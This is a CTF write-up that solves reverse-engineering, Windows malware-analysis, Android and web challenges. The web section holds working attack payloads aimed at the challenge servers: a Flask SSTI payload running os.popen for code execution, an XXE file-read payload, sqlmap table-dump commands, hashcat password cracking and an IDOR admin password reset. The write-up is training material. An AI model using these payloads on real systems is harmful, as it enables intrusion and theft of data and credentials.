## Writeups : DevCTF

So, I'll be explaining the techniques used by me to solve various challenges in this interesting CTF.

Lemme start with my second favorite category: Rev (the first one is pwn, obviously:p).
<br><br>

## Reverse Engineering

<section id="getargs">

## Challenge One : getargs
So, starting with the `file` command, I found out that the provided file is an ELF 64 bit shared object, so it can be easily decompiled using IDA Freeware. So, I loaded the file in IDA and used the decompiler to get a good idea about the pseudo code. The following image shows the pseudo code. 

<img src="https://github.com/0xSh4dy/infosec_writeups/blob/images/getArgs_img1.png">

It is clear that we need to provide one command line argument which will go through some procedure. If everything goes well, `Yes, <argument> is correct!` will be printed otherwise `No, <argument> is not correct.` will be printed to stdout. There's a char array or a string named `aAji9vl0c4p` whose value is `AJi9VL0C4p`. Also, there's a function `QM9Nq()`.
The pseudo code for this function can be easily found using IDA

```
__int64 QM9Nq()
{
  __int64 result; // rax
  int i; // [rsp+0h] [rbp-14h]

  for ( i = 1; ; ++i )
  {
    result = (unsigned int)i;
    if ( i >= 11 )
      break;
    if ( 4 * (i % 11) % 11 == 1 )
      return (unsigned int)i;
  }
  return result;
}
```

On executing this function in some separate C file, we can easily find out that its return value is 3. 
Now, we know everything. In order to get the correct input, we just need to add `QM9Nq()`  or 3 to each member of the array `aAji9vl0c4p` (easy reversing).

<img src="https://github.com/0xSh4dy/infosec_writeups/blob/images/getArgs_img2.png">

The final solution is:

```
#include<stdio.h>
#include<string.h>
int QM9Nq()
{
  int result; // rax
  int i; // [rsp+0h] [rbp-14h]

  for ( i = 1; ; ++i )
  {
    result = (unsigned int)i;
    if ( i >= 11 )
      break;
    if ( 4 * (i % 11) % 11 == 1 )
      return (unsigned int)i;
  }
  return result;
}
int main(){
    char str1[] = "AJi9VL0C4p";
    for(int i=0;i<strlen(str1);i++){
        putchar(str1[i]-QM9Nq());
    }
    return 0;
}
```
which gives the flag i.e `>Gf6SI-@1m`

<br><br>
 </section>
<section id="excess_chars">
  
## Challenge Two : Excess Chars
Hmm, so here comes yet another interesting ELF reverse engineering challenge. In this case, it was a 32 bit binary, therefore I used IDA Pro to decompile it. 

<img src="https://github.com/0xSh4dy/infosec_writeups/blob/images/excessChars_img1.png">


We can clearly see that there's not much stuff inside the main function. The `getInput` function is being called which just takes some user input and echoes it. 
```
int getInput()
{
  char v1[38]; // [esp+2h] [ebp-26h] BYREF

  puts("Enter:");
  __isoc99_scanf("%s", v1);
  return printf("Value entered: %s\n", v1);
}
```
Now, from the image above, we can see an interesting function named `printFlag`. On decompiling it, we get the following pseudo code:
```
int printFlag()
{
  if ( ptrace(PTRACE_TRACEME, 0, 1, 0) >= 0 )
    decryptAndPrint();
  return puts("Try triggering me without debugger\n");
}

So, this function contains some code which doesn't allow the user to use a debugger.
```
The decryptAndPrint() function contains the following stuff:
```
void __noreturn decryptAndPrint()
{
  unsigned __int8 v0; // [esp+6h] [ebp-22h] BYREF
  int v1[5]; // [esp+7h] [ebp-21h] BYREF
  char v2; // [esp+1Bh] [ebp-Dh]
  int i; // [esp+1Ch] [ebp-Ch]

  puts("Maybe you are in the right path ??");
  v1[0] = 1685383782;
  v1[1] = 1467003749;
  v1[2] = 997390087;
  v1[3] = 1713758503;
  v1[4] = 1329057042;
  v2 = 0;
  v0 = 38;
  for ( i = 0; i <= 19; ++i )
    *((_BYTE *)v1 + i) ^= *(&v0 + v0 + i % 4);
  printf("\nFlag you got is : %s", (const char *)v1);
  exit(0);
}
```
Our target is to either call the `printFlag` function or the `decryptAndPrint` function. Here, I'm not gonna mess up with the debugger. Instead, I'm gonna use my favorite tool radare2 to patch the binary.

```
r2 -w crackme2 -> Open the binary in writeable mode in radare2
aaa  -> Perform  auto analysis
s main  -> Seek to the address of the main function 

Now, press V to enter visual mode and then press p to see the instructions. Navigate to any address, let's say the address where getInput is called or call sym.getInpu

```
Now, find the address of `printFlag` which is 0x8049224. Modify a suitable instruction, let's say `call sym.imp.putchar` to `jmp 0x8049224`. Press Enter and save it, and then quit. Run the binary to get the flag!

<img src="https://github.com/0xSh4dy/infosec_writeups/blob/images/excessChars_img2.png">
  </section>
  
<section id="ten_little_phrases">

  ## Challenge3 :Ten Little Phrases
Similar to the previous challenge. Patch the binary using radare2, add a `jmp 0x80491a6` instruction where 0x80491a6 is the address of printFlag.
<img src="https://github.com/0xSh4dy/infosec_writeups/blob/images/10lill_1.png">

<img src="https://github.com/0xSh4dy/infosec_writeups/blob/images/10lill_2.png">
  </section>

After dealing with all the three ELF reversing challenges, I decided to go with Winrev.
<br><br>

<section id="payload">
  
## Challenge4 : Payload
So, in this challenge we were dealing with some kind of payload. The question asks for the resource name where the payload is located. So, i thought that some Resource related API function might have a major role in it. I explored through the dll using IDA Pro and found an interesting snippet

<img src="https://github.com/0xSh4dy/infosec_writeups/blob/images/payload.png">
```
hResInfo = FindResourceW(::hModule, (LPCWSTR)0x66, L"asdasdasdasdsad");
```
Thus, the flag is `asdasdasdasdsad`
  </section>

<section id="mutex">
  
## Challenge5: Mutex
We just need to find the name of the mutex used by the malware. On decompiling the function
`sub_10002300` we can find that
```
hObject = CreateMutexA(0, 0, "avcjkvcnmvcnmcvnmjdfkjfd");
```
which gives the mutex name as `avcjkvcnmvcnmcvnmjdfkjfd`
  </section>
<section id="which_address">
  
## Challenge6: WhichAddress
Here, we need to find which WINAPI function is send to CreateRemoteThreadAPI as a 4th parameter at location 0x10002174
Peeking at this particular location using IDA Pro, we find he following code
```
hHandle = CreateRemoteThread(hProcess, 0, 0, lpStartAddress, lpAddress, 0, ThreadId);
where,
lpStartAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, "LoadLibraryA");
```
So, `LoadLibraryA` is the required answer
  </section>
<section id="privileged">
  
## Challenge7: Privileged
Here, we have to find the token privileges gained by the malware. Again, we need to explore through the code using IDA Pro. I found a function `sub_100019a0` which contains
```
if ( OpenProcessToken(CurrentProcess, 0x28u, &TokenHandle) )
  {
    LookupPrivilegeValueA(0, "SeDebugPrivilege", &NewState.Privileges[0].Luid);
    NewState.PrivilegeCount = 1;
    NewState.Privileges[0].Attributes = 2;
    AdjustTokenPrivileges(TokenHandle, 0, &NewState, 0, 0, 0);
  }
```
So, it is clear that the token privilege gained by the malware is `SeDebugPrivilege`
  </section>
<section id="drop_this">
  
## Challenge8: DropThis
Now, we need to find the file name of the dropped payload. On decompiling the function
`sub_10002250`, we find that 
```
sub_10002B3B(a3, 260, "iexplore-1.dat"); 
```                                     
So, the filename is `iexplore-1.dat`
  </section>

<section id="level_up">
  
## Challenge9: LevelUp
Here, we need to find the process in which tries to inject the dropped payload. So, this is easy as well. Since the injected payload was iexplore-1.dat, I googled it to find the process name and luckily it came out to be `iexplore.exe` which is the flag.
  </section>

<section id="sha1">
  
## Challenge10: SHA1
I loaded the dll in the site https://manalyzer.org/ which gives various details including the SHA1 hash of dropped payload. Navigate to the resources section and get the hash

<img src="https://github.com/0xSh4dy/infosec_writeups/blob/images/sha1.png">
  </section>

Now, let's move on to the Android category.

<section id="pinbreak">
  
## Challenge11: Pinbreak
Here, we were provided an APK in which the primary language used for development was Java. So, we can use JADX-GUI to view the source code of the application. On analysing the code present in Main Activity, I found out that something was being loaded from the database via the `fetchPin()` function. This function looks as:
```
public String fetchPin() throws IOException {
        openDB();
        Cursor cursor = this.db.rawQuery("SELECT pin FROM pinDB", null);
        String pin = "";
        if (cursor.moveToFirst()) {
            pin = cursor.getString(0);
        }
        cursor.close();
        return pin;
    }

```

After that, I used apktool: `apktool d pinbreak.apk`, navigated to the assets folder and found out a database file named `pinlock.db`. I opened it in an online SQLite browser and ran the query `SELECT pin from pinDB` to get the pin :`bae5c9d883433f2d1e926ef693831dafa1664306`.

This is a SHA1 hash, so I decided to crack it using hashcat, using the wordlist `rockyou.txt`.

```
hashcat -m 100 -a 0 bae5c9d883433f2d1e926ef693831dafa1664306  /home/rakshit/InfoSec/Misc/Wordlists/rockyou.txt  --force
```
It gives us the cracked value: 9264
After that, I ran the apk in an emulator. It asks for a pin, so I entered the pin `9264` and boom, got the flag!

<img src="https://github.com/0xSh4dy/infosec_writeups/blob/images/pinbreak.png">
  </section>

<section id="so_difficult">
  
## Challenge12: soDifficult
Without any doubt, I opened the provided one of the apks `app-x86_64-release.apk` in JADX and started reversing com.ctf.rev.MainActivity. So, there's a function named checkPassword which might be verifying some kind of password entered by the user via an EditText.

```
public void checkPassword(View view) {
    String charSequence = ((TextView) findViewById(R.id.editText)).getText().toString();
    Context applicationContext = getApplicationContext();
    Toast.makeText(applicationContext, "RESULT:" + checkPassword3(charSequence), 0).show();
    }
```
The user input, i.e. charSequence is passed to the function checkPassword3 which is a part of the native code (you can notice it easily in MainActivity).
```
public native String checkPassword3(String str);
```
So, in order to find out the exact location of this native function, we'll have to find the shared library that works for x86_64 architecture. First of all, use apktool
```
apktool d app-x86_64-release.apk
```
Go to the app-x86_64-release/lib/x86_64 folder. Here, we can find a shared library named `libnative-lib.so`. So, I decided to reverse the library using IDA. The important thing is that we do not need to reverse the entired library. We only need to focus on the function
`checkPassword3`. It can be found under the name `Java_com_ctf_rev_MainActivity_checkPassword3`. I decompiled this function and got the following results:

<img src="https://github.com/0xSh4dy/infosec_writeups/blob/images/so_difficult_1.png">

So, it's a classical challenge that can be solved using z3 . After that, I wrote a simple z3 script to get the password.

```
from z3 import *
s = Solver()
inp = [BitVec(f"{i}",32) for i in range(20)]
v4 = inp[14]
v5 = inp[3]
v23 = inp[11]
v31 = inp[6]
v6 = inp[7]
v13 = inp[1]
v7 = inp[5]
v26 = inp[4]
v30 = inp[9]
v25 = inp[10]
v24 = inp[18]
v28 = inp[17]
v12 = inp[16]
v8 = inp[0]
v9 = inp[15]
v27 = inp[2]
v29 = inp[19]
v10 = inp[8]
v11 = inp[12]
s.add(v5 + v4 + v23 * v4 == 11451)
s.add(2 * v31 - v23 == 125)
s.add(v23 * v6 == 6745)
s.add(v7 - v26 - v31 == -168)
s.add(v24 + v4 * v25 * v30 == 577829)
s.add(v25 == 102)
s.add(v28 + v7 + v24 == 203)
s.add(v8 + v26 * v28 == 5770)
s.add(v24 * v5 + v10 + v9 == 12569)
s.add( v4 + v30 + v8 * v5 == 12343)
s.add( v7 * v5 + v7 - v5 == 5953)
s.add( v6 + v23 * v29 * v27 == 1211321)
s.add(v6 + v24 - v7 == 123)
s.add(v9 + v24 == 152)
s.add(v8 * v4 * v5 == 1436886)
s.add(v5 + v27 == 225)
s.add(v8 == 99)
s.add(v11 - v25 * v5 == -12464)
s.add(v8 * v4 + v4 + v30 == 11848)
s.add(v30 + v8 + 2 * v25 == 351)
s.add( v7 - v7 * v12 * inp[13] == -284837)
s.add(v29 + v28 - v11 * v5 == -9908)
s.add(v8 + v11 - v24 == 80)
s.add(v8 + v25 * v30 == 4995)
s.add(v11 + v25 - v28 == 131)
s.add(v4 - v4 * v5 == -14396)
s.add(v12 == 114)
s.add(v30 - (v7 + v24) == -102)
s.add(v27 == 102)
s.add( v24 - v26 * v23 == -10064)
s.add(v24 * v29 - v8 == 12526)
s.add(v28 * v7 * v27 == 264894)
s.add( v31 + v23 * v11 == 7900)
s.add(v9 + v26 - v23 == 63)
s.add(v7 + v25 - v13 == 35)
s.add(v25 + v24 * v7 * v9 == 252501)
s.add( v29 + v7 - v10 == 79)
s.add(v27 + v12 + v26 * v10 == 10381)
s.add(v12 * inp[13] + v26 + v13 == 6037)
s.check()
m = s.model()
ans = sorted([(d,m[d]) for d in m],key=lambda x: int(str(x[0])))
flag = ''.join(chr(int(str(j))) for _,j in ans)
print(flag)
```
On running this script, I got the flag

<img src="https://github.com/0xSh4dy/infosec_writeups/blob/images/so_difficult_2.png">
  </section>

<section id="lit_part_2">
  
## Challenge13: Lit-Part2
So, this was yet another android reversing challenge but reversing this apk was pretty difficult because the code here was obfuscated. However, there had to be some way to solve it. I noticed a piece of code related to Firebase. I guessed, there might be something related to Firebase. I googled some stuff and found out that the android applications using firebase contain a specific url that contains `firebaseio` in it. I used apktool on the provided apk and then did a recursive grep to find out if such string exists. Luckily, I got something:
```
grep -r "firebaseio"                                           
cloud/smali/e4/g.smali:    const-string v3, "-default-rtdb.firebaseio.com"
Binary file classes.dex matches
```
Then, I searched for the string in JADX and got the following results:
```
str = b.a(sb, d5.f2949c.f6734g, "-default-rtdb.firebaseio.com");
```
I went to the exact location of this piece of code and found out this:
```
if (d5.f2949c.f6734g != null) {
                StringBuilder sb = new StringBuilder();
                sb.append("https://");
                d5.b();
                str = b.a(sb, d5.f2949c.f6734g, "-default-rtdb.firebaseio.com");
          }
```
I realised that this particular piece of code is appending -default-rtdb.firebaseio.com to something and https:// , probably trying to construct a URL. In order to find out the value of d5.f2949c.f6734g, I double clicked on f6734g(in JADX) and found something interesting:

```
....
public i(String str, String str2, String str3, String str4, String str5, String str6, String str7) {
        int i5 = e.f4621a;
        d.f(true ^ (str == null || str.trim().isEmpty()), "ApplicationId must be set.");
        this.f6729b = str;
        this.f6728a = str2;
        this.f6730c = str3;
        this.f6731d = str4;
        this.f6732e = str5;
        this.f6733f = str6;
        this.f6734g = str7;
    }

......
 public static i a(Context context) {
        m mVar = new m(context);
        String g5 = mVar.g("google_app_id");
        if (TextUtils.isEmpty(g5)) {
            return null;
        }
        return new i(g5, mVar.g("google_api_key"), mVar.g("firebase_database_url"), mVar.g("ga_trackingId"), mVar.g("gcm_defaultSenderId"), mVar.g("google_storage_bucket"), mVar.g("project_id"));
    }

```
Immediately, I realised the the thing that would be concatenated to https:// would be the value of `project_id`, followed by `-default-rtdb.firebaseio.com`. I searched for project_id in strings.xml and got this thing:

```
 <string name="project_id">mongodb-e98ea</string>
```
So,I noted down the final url-> https://mongodb-e98ea-default-rtdb.firebaseio.com
After googling some stuff, I found out that there exists a /.json endpoint for such urls.
I opened the link https://mongodb-e98ea-default-rtdb.firebaseio.com/.json but got
```
{
  "error" : "Permission denied"
}
```
After that, I just randomly guessed about trying flag.json and got the flag:p

`https://mongodb-e98ea-default-rtdb.firebaseio.com/flag.json`

<img src="https://github.com/0xSh4dy/infosec_writeups/blob/images/lit2.png">
  </section>

<section id="lit_part_1">
  
## Challenge14: LitPart1

Hmm, I was do confused what to do now, since the /flag.json endpoint gives the flag for litPart2. So, I viewed the MainActivity once again, carefully. 
```
try {
      if (FirebaseAuth.getInstance().f2964f != null) {
            e4.g a5 = e4.g.a();
            String format = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(new Date());
            String date = Calendar.getInstance().getTime().toString();
            e4.d c5 = a5.b("rCpOr6eRlLDWW0pfAeQV/").a("sharString").a(format).c();
            c5.d(date + "  Amazing  Image");
            } else {
              Log.d("FirebaseAuthentication", "Failure");
            }
        } catch (Exception e5) {
            e5.printStackTrace();
        }
```
I wondered, what is the purpose of the string `rCpOr6eRlLDWW0pfAeQV/`. The slash at the end indicates that it might be an API endpoint. I confirmed it by doing more reversing and ultimately got the url https://mongodb-e98ea-default-rtdb.firebaseio.com/rCpOr6eRlLDWW0pfAeQV/. Now, I know that there exists a /.json endpoint. Open the link https://mongodb-e98ea-default-rtdb.firebaseio.com/rCpOr6eRlLDWW0pfAeQV/.json to get the flag.

<img src="https://github.com/0xSh4dy/infosec_writeups/blob/images/lit1.png">
  </section>

Now, let's move on to web challenges.

## Challenge15: TheGoodOldDays
So, on visiting the site, we got something interesting: `Wrong Information, Our Community Members use Old Windows Laptops. You are using a New Linux`. Immediately, I understood that this challenge is related to User Agents. After that, on changing Sec-Ch-Ua-Platform: "Linux" to Sec-Ch-Ua-Platform: "Windows", we get `Wrong Information, Our Community Members use Old Windows Laptops. You are using a New Windows`. I googled stuff and found out a site, https://networking.ringofsaturn.com/Web/useragents.php. From there, I set the user agent as `Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)` and got the flag.

## Challenge16: UnChangeablePasswords
So, first of all, create a new account. Since, the challenge name is Unchangeable Password, there must be some vulnerability in changing the password. So, on opening the url for the Change Password page, i.e https://web.ctf.devclub.in/web/2/reset.php, we get an input box for entering a new password. Turn on the proxy, change password. You'll notice that the request captured using burp suite contains `user_id=ash&pass=aaaa` which means that we have a client side control on `user_id` . After that, use the user_id as admin to change the admin password. After that, login as admin with the password set by you to get the flag. `CTF{Pr311y_bas1c_1D0R}`
<img src="https://github.com/0xSh4dy/infosec_writeups/blob/images/unchangeable_passwords.png">

## Challenge17: FlagAuction
So, the title of the challenge page was `Python Flask Simple Shopping Cart` . Hmm, `Python Flask`, interesting! Idk why my mind says , `Try SSTI` whenever I see Flask. So, I noticed the request for buying a smartphone: it was https://web.ctf.devclub.in/web/4/buy/Smartphone. I used burp and replaced Smartphone with `{{7*'7'}}` in order to test the SSTI payload. And yeah, it executed successfully. See the following image for the actual request sent using BurpSuite.
After that, I replaced {{7*'7'}} with `{{namespace.__init__.__globals__.os.popen('id').read()}}` and got the following result:
```
HTTP/2 200 OK
Date: Mon, 09 May 2022 10:36:15 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 79
Server: nginx/1.20.2
Refresh: 2; url=../

Trying to Buy <b>uid=1001(ctf) gid=1001(ctf) groups=1001(ctf)
</b>  Please Wait
```
This is a definite RCE. Now, we need to find the flag file. I used a recursive grep on the word `CTF`, on all the directories present in `/` and found out the flag, which was present in the `/srv` directory. Final payload ->
`/web/4/buy/{{namespace.__init__.__globals__.os.popen('grep%20-r%20/srv%20-e%20CTF').read()}}`. %20 is used to add the extra space (since we are sending our payload through a GET request).


## Challenge18: The Sequel
As the name says (our beloved Sequel:p), this was an SQL Injection challenge. Btw I'm a hard worker whenever I solve pwn challenges but I'm lazy with web. So, I used SQLMap. I used `sqlmap -u "https://web.ctf.devclub.in/web/1/login.php" --dbms=MySQL --tables --forms`  to dump the table and the database name. After sometime, SQLmap did its job and dumped the information_schema and the database name for me. 
<img src="https://github.com/0xSh4dy/infosec_writeups/blob/images/sqlmap_i1.png">

<img src="https://github.com/0xSh4dy/infosec_writeups/blob/images/sqlmap_i2.png">


After knowing the table database and the table name, I used SQLmap as `sqlmap -u "https://web.ctf.devclub.in/web/1/login.php" --dbms=MySQL --tables --forms -D web1_db -T tbl_users --dump`. This command is used to dump data out of the specified table, if it exists. Finally, I got the result. 
<img src="https://github.com/0xSh4dy/infosec_writeups/blob/images/sqlmap_i3.png">

After that, I used hashcat to crack the password hash using
```
hashcat -m 0 -a 0 386b8fe06ad1d01e027de7270f48822d  /home/rakshit/InfoSec/Misc/Wordlists/rockyou.txt --show 
```
<>
and yo babe, I got the password `wildspirit`
After that, I logged in using the username `as1605` and the password `wildspirit` and got the flag.


## Challenge19: CipherText
So, there was an input textarea in this challenge which basically applies ROT13 on our input and then renders it. I discovered that this site was vulnerable to XSS but couldn't get anything of it. After striking my head several times on the wall out of frustration (while finding the vulnerability in this challenge), I changed the Content-Type to application/xml 
```
Content-Type: application/xml
```
and it gave intresting results. 


So, I realised that this challenge is related to XXE (XML External Entity). I used the regular payload used for XXE challenges:
```
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY redacted SYSTEM 'file:///flag.txt'>]><shady><text>&redacted;</text></shady>
```
Luckily, the flag was also stored in flag.txt . Thus, I got the flag


## Challenge20: Scientific Hashes
This challenge just asks for a password. The word `PHosPhorous`  says that this challenge is related to PHP. Hint1 states that `Hint 1 : You seriously need to get some NaCl !!!` NaCl is common salt, so it is clear that we have to do something with the password and a salt. Now, a suggestion given to me by an American Security enthusiast girl helped -> Always use BurpSuite while solving CTF challenges related to Web Exploitation. So, I sent a request to enter the password using burp and found out an interesting thing
```
Set-Cookie: Salt=f789bbc328a3d1a3; expires=Mon, 09-May-2022 
```
Thus, we got the salt. According to my experience, one common thing encountered while solving PHP related challenges having a password is Loose Comparison (using ==). Things starting with 0e equate to 0. So, I copied a script from a past CTF challenge , appended a value to the salt and computed the hash which starts with 0e
```
#!/usr/bin/env python
import hashlib
import re

prefix = '0e'


def breakit():
    iters = 0
    while 1:
        s = "f789bbc328a3d1a3"+str(iters)
        hashed_s = hashlib.md5(s).hexdigest()
        iters = iters + 1
        r = re.match('^0e[0-9]{30}', hashed_s)
        if r:
            print "[+] found! md5( {} ) ---> {}".format(s, hashed_s)
            print "[+] in {} iterations".format(iters)
            exit(0)

        if iters % 1000000 == 0:
            print "[+] current value: {}       {} iterations, continue...".format(s, iters)

breakit()
```
<img src="https://github.com/0xSh4dy/infosec_writeups/blob/images/s_hash.png">

## Challenge21: CaptchaTheFlag
So, the challenge page containes a Captcha with some string in it. Every time you reload the page, the captcha changes. I was kinda happy cause one month ago, I tried a similar challenge named `ReReCaptcha` in UTCTF. So, I read one of the writeups https://ubcctf.github.io/2022/03/utctf-rerecaptcha/ , and modified the script to 

```
import time
import requests, io, hashlib
import base64
from PIL import Image
import cv2
import pytesseract


CAPT = set()

URL = "https://web.ctf.devclub.in/dev/4/"


def save(byts, i):
    stream = io.BytesIO(byts)
    img = Image.open(stream)
    # print("aaaa.png")   
    img.save("aaaa.png")
    captcha = Image.open("aaaa.png")
    img = cv2.imread('aaaa.png')
    config = ('-l eng --oem 1 --psm 3')
    text = pytesseract.image_to_string(img, config=config)
    text = text.split('\n')
    txt = text[0]
    print(txt)
    r = requests.post(URL,data={"captcha":txt}).text
    print(r)

def fetchImage(i):
    r = requests.get(URL)
    content = r.content
    soup = BeautifulSoup(content, 'lxml')
    tag = soup.find('img')
    byts = base64.b64decode(
        tag['src'][len('data:image/png;base64, '):])
    hash = hashlib.md5(byts).hexdigest()
    CAPT.add(hash)
    save(byts, i)

fetchImage(0)
```
This script basically extracts the text out of the captcha and POSTs it . Finally, on running the script I got the flag 
`devctf{0k@y!_y0u_@re_@_hum@n}`


## Challenge22: Bonjour
This was an Android Reverse Engineering Challenge. But, I was kinda sad when I tried to view the source code using JADX but there was nothing good. The package name used here was `ctf.stagno`. I thought maybe this challenge would be related to steganography. After that, I used apktool to unpack the apk and viewed strings.xml as usual. One of the strings was quite interesting: 
```
<string name="zip">i_am_not_the_flag_but_i_will_help_you</string>
```
I thought maybe we have to find a zip file and unlock it using the passphrase above. For that, I unzipped the apk
```
unzip bonjour.apk
```
I changed the directory to res and found out that a lot of images were present there. Initially, I targeted the jpg images cause they were lesser in number.  On using binwalk on the image `Sl.jpg`, I found out that a zip file was embedded in this image. Unzipping this password protected zip file using the password `i_am_not_the_flag_but_i_will_help_you`, we get the file flag.txt 

<img src="https://github.com/0xSh4dy/infosec_writeups/blob/images/bonjour.png">
